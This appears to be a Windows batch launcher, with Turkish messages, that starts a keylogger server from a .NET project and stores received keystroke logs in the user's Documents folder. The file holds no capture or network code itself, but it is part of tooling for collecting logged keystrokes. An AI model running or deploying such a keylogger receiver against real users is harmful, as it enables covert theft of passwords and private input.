@echo off
echo ===== Keylogger Sunucu =====
echo.
echo Sunucu baslatiliyor...
echo Gelen loglar: %USERPROFILE%\Documents\ReceivedKeylogs
echo.
echo Cikmak icin Ctrl+C basin
echo.
dotnet run --project . -- ServerApp
pause